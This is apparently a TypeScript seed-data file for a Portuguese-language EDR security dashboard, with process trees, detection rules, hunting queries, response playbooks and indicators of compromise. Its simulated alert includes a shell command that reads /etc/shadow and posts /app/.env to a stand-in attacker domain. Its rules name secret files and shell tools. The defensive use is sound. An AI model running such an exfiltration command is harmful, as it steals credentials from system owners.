import {
  EdrProcessNode,
  EdrBehavioralRule,
  EdrMemoryDumpAnalysis,
  EdrThreatHuntingQuery,
  EdrLiveTelemetry,
  EdrHostEndpoint,
  EdrResponsePlaybook,
  EdrIocItem,
  EdrRtrCommandResult
} from '../types/edr';

export const INITIAL_PROCESS_TREES: EdrProcessNode[] = [
  {
    pid: 1402,
    ppid: 1,
    name: 'systemd',
    commandLine: '/sbin/init',
    hashSha256: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855',
    user: 'root',
    integrityLevel: 'SYSTEM',
    startTime: 'Hoje, 00:01:00',
    threatScore: 0,
    actionTaken: 'ALLOW',
    networkConnections: [],
    fileModifications: [],
    children: [
      {
        pid: 2410,
        ppid: 1402,
        name: 'dockerd',
        commandLine: '/usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock',
        hashSha256: '9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08',
        user: 'root',
        integrityLevel: 'SYSTEM',
        startTime: 'Hoje, 00:01:15',
        threatScore: 10,
        actionTaken: 'ALLOW',
        networkConnections: [
          { protocol: 'TCP', localPort: 2375, remoteAddress: '127.0.0.1', remotePort: 48210, state: 'ESTABLISHED' }
        ],
        fileModifications: ['/var/run/docker.pid'],
        children: [
          {
            pid: 5124,
            ppid: 2410,
            name: 'node (Payment Microservice)',
            commandLine: 'node dist/server.cjs --port 3000 --env production',
            hashSha256: '5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8',
            user: 'app-runner',
            integrityLevel: 'MEDIUM',
            startTime: 'Hoje, 06:12:40',
            threatScore: 78,
            actionTaken: 'SUSPICIOUS',
            networkConnections: [
              { protocol: 'TCP', localPort: 3000, remoteAddress: '0.0.0.0', remotePort: 0, state: 'LISTENING' },
              { protocol: 'TCP', localPort: 48912, remoteAddress: '54.187.128.99', remotePort: 443, state: 'ESTABLISHED' }
            ],
            fileModifications: ['/tmp/payment-batch-trace.log', 'src/config/aws.ts'],
            children: [
              {
                pid: 7921,
                ppid: 5124,
                name: 'sh (Child Shell Spawned)',
                commandLine: '/bin/sh -c "cat /etc/shadow || curl -d @/app/.env https://attacker-dropzone.ru/log"',
                hashSha256: '4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8a',
                user: 'app-runner',
                integrityLevel: 'MEDIUM',
                startTime: 'Hoje, 08:44:12',
                threatScore: 99,
                actionTaken: 'TERMINATE',
                networkConnections: [
                  { protocol: 'TCP', localPort: 52194, remoteAddress: '198.51.100.44', remotePort: 443, state: 'SYN_SENT' }
                ],
                fileModifications: ['/etc/passwd (READ_ATTEMPT)', '/app/.env (READ_ATTEMPT)'],
                children: []
              }
            ]
          }
        ]
      }
    ]
  }
];

export const INITIAL_BEHAVIORAL_RULES: EdrBehavioralRule[] = [
  {
    id: 'EDR-RULE-01',
    name: 'Spawn de Shell Interativo via Processo Web Node/Python/Java',
    mitreTactic: 'Execution',
    mitreTechnique: 'T1059.004 - Command and Scripting Interpreter: Unix Shell',
    severity: 'CRITICAL',
    triggerCondition: 'parent_process in ("node", "python3", "java", "nginx") and child_process in ("sh", "bash", "zsh", "cmd.exe", "powershell.exe")',
    autoRemediation: 'KILL_PROCESS_TREE',
    active: true,
    hitsCount: 14
  },
  {
    id: 'EDR-RULE-02',
    name: 'Tentativa de Acesso ou Leitura de Arquivo .env / Secrets Store',
    mitreTactic: 'Credential Access',
    mitreTechnique: 'T1552.001 - Credentials In Files',
    severity: 'HIGH',
    triggerCondition: 'file_read_path regex_match ("(\\.env|id_rsa|credentials|kube/config)") and process_name != "vault-agent"',
    autoRemediation: 'QUARANTINE_FILE',
    active: true,
    hitsCount: 39
  },
  {
    id: 'EDR-RULE-03',
    name: 'Process Hollowing & Manipulação de Memória RWX Não Alocada',
    mitreTactic: 'Defense Evasion',
    mitreTechnique: 'T1055.012 - Process Injection: Process Hollowing',
    severity: 'CRITICAL',
    triggerCondition: 'virtual_alloc_protection == "PAGE_EXECUTE_READWRITE" and caller_module != "trusted_runtime"',
    autoRemediation: 'ISOLATE_HOST',
    active: true,
    hitsCount: 2
  },
  {
    id: 'EDR-RULE-04',
    name: 'Conexão Reversa para Faixas de IPs de Tor Exit Nodes',
    mitreTactic: 'Exfiltration',
    mitreTechnique: 'T1071.001 - Application Layer Protocol: Web Protocols',
    severity: 'HIGH',
    triggerCondition: 'outbound_ip in tor_exit_nodes_feed or outbound_sni matches "\\.onion$"',
    autoRemediation: 'KILL_PROCESS_TREE',
    active: true,
    hitsCount: 7
  }
];

export const INITIAL_MEMORY_DUMPS: EdrMemoryDumpAnalysis[] = [
  {
    id: 'DUMP-9921',
    endpointHostname: 'prod-api-gateway-01',
    processName: 'node (dist/server.cjs)',
    pid: 5124,
    dumpSizeMb: 142.6,
    extractedSecretsCount: 4,
    yaraRuleMatches: ['SUSP_Suspicious_Eval_Pattern', 'CRED_Aws_Key_Format', 'UNSAFE_Deserialization_Signature'],
    injectedDlls: [],
    hollowedMemoryRegions: false,
    status: 'FLAGGED',
    timestamp: 'Hoje, 08:44:30'
  },
  {
    id: 'DUMP-9922',
    endpointHostname: 'worker-node-k8s-pod-7',
    processName: 'redis-server',
    pid: 3012,
    dumpSizeMb: 88.2,
    extractedSecretsCount: 0,
    yaraRuleMatches: [],
    injectedDlls: [],
    hollowedMemoryRegions: false,
    status: 'ANALYZED',
    timestamp: 'Hoje, 07:15:10'
  }
];

export const INITIAL_HUNTING_QUERIES: EdrThreatHuntingQuery[] = [
  {
    id: 'HUNT-01',
    title: 'Detecção de LOLBins (Living off the Land Binaries)',
    category: 'LOLBINS',
    queryText: 'EventType == "ProcessCreation" and ProcessName in ("certutil.exe", "bitsadmin.exe", "curl", "wget") and CommandLine contains "-O" or CommandLine contains "http"',
    matchesFound: 3,
    description: 'Localiza utilitários nativos do sistema operacional utilizados para baixar payloads secundários ou exfiltrar dados.'
  },
  {
    id: 'HUNT-02',
    title: 'Exfiltração DNS / Túneis ICMP Ocultos',
    category: 'REVERSE_SHELL',
    queryText: 'NetworkProtocol in ("DNS", "ICMP") and PayloadLength > 512 and RequestRatePerMinute > 120',
    matchesFound: 1,
    description: 'Identifica canais C2 de baixa frequência que encapsulam tráfego em consultas DNS longas ou pacotes Echo Request.'
  },
  {
    id: 'HUNT-03',
    title: 'Injeção de Bibliotecas / LD_PRELOAD Hijacking',
    category: 'PERSISTENCE',
    queryText: 'EnvironmentVariables contains "LD_PRELOAD" or EnvironmentVariables contains "DYLD_INSERT_LIBRARIES"',
    matchesFound: 0,
    description: 'Detecta interceptação de chamadas de sistema através de bibliotecas compartilhadas injetadas antes do carregamento normal.'
  }
];

export const INITIAL_EDR_TELEMETRY: EdrLiveTelemetry = {
  agentStatus: 'HEALTHY',
  kernelDriver: 'eBPF / Windows Filter Driver (Active)',
  totalMonitoredProcesses: 432,
  blockedAttacksToday: 23,
  quarantinedBinaries: 5,
  networkSensorsActive: 16,
  tamperProtection: 'ENABLED (Protected Process Light)'
};

export const INITIAL_HOST_ENDPOINTS: EdrHostEndpoint[] = [
  {
    id: 'EP-001',
    hostname: 'prod-api-gateway-01',
    ip: '10.0.1.15',
    macAddress: '02:42:0a:00:01:0f',
    os: 'Ubuntu Linux 24.04 LTS (Kernel 6.8.0-31-generic eBPF)',
    agentVersion: 'v4.2.1-kernel-prober',
    isolationStatus: 'NORMAL',
    containmentMode: 'NONE',
    criticality: 'MISSION_CRITICAL',
    activeAlertsCount: 3,
    lastSeen: 'Agora (Tempo real)',
    cpuLoad: 28.4,
    memoryUsageMb: 3410
  },
  {
    id: 'EP-002',
    hostname: 'worker-node-k8s-pod-7',
    ip: '10.0.2.88',
    macAddress: '02:42:0a:00:02:58',
    os: 'Debian GNU/Linux 12 (bookworm)',
    agentVersion: 'v4.2.1-kernel-prober',
    isolationStatus: 'NORMAL',
    containmentMode: 'NONE',
    criticality: 'HIGH',
    activeAlertsCount: 1,
    lastSeen: 'Há 12s',
    cpuLoad: 64.2,
    memoryUsageMb: 7890
  },
  {
    id: 'EP-003',
    hostname: 'db-primary-postgresql-pg01',
    ip: '10.0.3.10',
    macAddress: '02:42:0a:00:03:0a',
    os: 'Red Hat Enterprise Linux 9.4 (Plow)',
    agentVersion: 'v4.2.0-kernel-prober',
    isolationStatus: 'NORMAL',
    containmentMode: 'NONE',
    criticality: 'MISSION_CRITICAL',
    activeAlertsCount: 0,
    lastSeen: 'Agora (Tempo real)',
    cpuLoad: 14.1,
    memoryUsageMb: 14200
  },
  {
    id: 'EP-004',
    hostname: 'devsecops-runner-ci-03',
    ip: '10.0.4.52',
    macAddress: '02:42:0a:00:04:34',
    os: 'Alpine Linux v3.20 (musl)',
    agentVersion: 'v4.2.1-kernel-prober',
    isolationStatus: 'ISOLATED',
    containmentMode: 'KERNEL_FILTER',
    criticality: 'MEDIUM',
    activeAlertsCount: 2,
    lastSeen: 'Há 1m',
    cpuLoad: 92.8,
    memoryUsageMb: 2150
  }
];

export const INITIAL_RESPONSE_PLAYBOOKS: EdrResponsePlaybook[] = [
  {
    id: 'PB-01',
    name: 'Auto-Containment por Process Hollowing ou Shell Indevido',
    triggerEvent: 'Disparo de regra CRITICAL (EDR-RULE-01 / EDR-RULE-03)',
    description: 'Interrompe a árvore de processos maliciosos em tempo real via SIGKILL kernel, congela descritores de sockets e gera snapshot de memória.',
    steps: [
      '1. Kernel hook intercepta chamada fork/execve não autorizada',
      '2. Envia sinal SIGKILL para árvore de processos (PID e filhos)',
      '3. Coleta dump de memória volátil da região RWX para /var/log/edr/dumps',
      '4. Bloqueia porta TCP/UDP e emite notificação para canal SOC/Webhook'
    ],
    executionType: 'AUTOMATED',
    status: 'COMPLETED',
    lastRun: 'Hoje, 08:44:12 (Processo PID 7921 eliminado)'
  },
  {
    id: 'PB-02',
    name: 'Quarentena de Binário e Validação de Reputação Hash',
    triggerEvent: 'Arquivo gravado em /tmp ou /dev/shm com hash desconhecido',
    description: 'Calcula SHA-256 e SHA-1, compara com base VirusTotal/Cthulhu e remove permissões de execução (chmod 000).',
    steps: [
      '1. Sensor inotify/eBPF detecta criação de executável em pasta temporária',
      '2. Submete hash contra repositório local de IOCs',
      '3. Aplica atributo imutável chattr +i e remove bit de execução',
      '4. Move arquivo para cofre criptografado de quarentena'
    ],
    executionType: 'AUTOMATED',
    status: 'READY'
  },
  {
    id: 'PB-03',
    name: 'Isolamento de Host em Rede (Host Network Isolation)',
    triggerEvent: 'Múltiplos alertas de movimentação lateral e dumping de credenciais',
    description: 'Corta todo tráfego IP de entrada e saída (IPTables / nftables DROP), mantendo unicamente túnel TLS seguro com o servidor SecScan EDR.',
    steps: [
      '1. Limpa regras de encaminhamento e estabelece default DROP em INPUT/OUTPUT',
      '2. Insere exceção bidirecional apenas para a porta segura 443 do sensor SecScan',
      '3. Encerra sessões SSH e VPNs ativas no endpoint',
      '4. Sinaliza console de telemetria com status ISOLATED'
    ],
    executionType: 'HUMAN_CONFIRMATION',
    status: 'READY'
  }
];

export const INITIAL_IOC_ITEMS: EdrIocItem[] = [
  {
    id: 'IOC-001',
    type: 'SHA256',
    value: '4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8a',
    threatType: 'Reverse Shell Dropper (ELF)',
    confidence: 99,
    mitreRef: 'T1059.004',
    action: 'BLOCK_AND_KILL',
    dateAdded: 'Hoje, 08:44'
  },
  {
    id: 'IOC-002',
    type: 'IPV4',
    value: '198.51.100.44',
    threatType: 'Command & Control (C2) Listener',
    confidence: 95,
    mitreRef: 'T1071.001',
    action: 'BLOCK_AND_KILL',
    dateAdded: 'Hoje, 08:40'
  },
  {
    id: 'IOC-003',
    type: 'DOMAIN',
    value: 'attacker-dropzone.ru',
    threatType: 'Exfiltration Sinkhole / Dropzone',
    confidence: 100,
    mitreRef: 'T1048',
    action: 'BLOCK_AND_KILL',
    dateAdded: 'Hoje, 07:12'
  },
  {
    id: 'IOC-004',
    type: 'FILE_PATH',
    value: '/tmp/payment-batch-trace.log',
    threatType: 'Staging de Credenciais & Tokens',
    confidence: 88,
    mitreRef: 'T1074.001',
    action: 'QUARANTINE',
    dateAdded: 'Hoje, 06:15'
  }
];

export const INITIAL_RTR_COMMANDS: EdrRtrCommandResult[] = [
  {
    id: 'RTR-01',
    command: 'ps -eo pid,ppid,user,%cpu,%mem,cmd --sort=-%cpu | head -n 8',
    output: `PID  PPID USER     %CPU %MEM CMD
 5124  2410 app-runner 18.2  4.1 node dist/server.cjs --port 3000
 7921  5124 app-runner 84.1  1.2 /bin/sh -c "cat /etc/shadow || curl -d @/app/.env..."
 2410  1402 root        2.3  1.5 /usr/bin/dockerd
 1402     1 root        0.1  0.4 /sbin/init`,
    timestamp: 'Hoje, 08:44:10',
    status: 'SUCCESS',
    exitCode: 0
  },
  {
    id: 'RTR-02',
    command: 'netstat -tulpen | grep -E "(ESTABLISHED|LISTEN)"',
    output: `tcp 0 0 0.0.0.0:3000 0.0.0.0:* LISTEN 5124/node
tcp 0 1 10.0.1.15:52194 198.51.100.44:443 SYN_SENT 7921/sh
tcp 0 0 10.0.1.15:48912 54.187.128.99:443 ESTABLISHED 5124/node`,
    timestamp: 'Hoje, 08:44:11',
    status: 'SUCCESS',
    exitCode: 0
  }
];
